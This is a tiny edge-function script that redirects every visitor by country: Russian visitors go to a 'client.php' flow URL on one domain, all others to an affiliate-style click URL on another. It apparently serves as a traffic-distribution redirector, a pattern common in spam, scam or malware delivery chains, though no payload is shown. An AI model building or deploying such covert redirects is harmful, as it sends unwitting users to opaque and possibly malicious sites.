export const config = {
  runtime: 'edge',
};

export default async function handler(req) {
  const country = req.headers.get("x-vercel-ip-country") || "XX";

  if (country === "RU") {
    return Response.redirect("https://newwebl.pro/client.php?flow=254249-271444-1", 302);
  }

  return Response.redirect("https://smark.top/click?o=2&a=1551", 302);
}
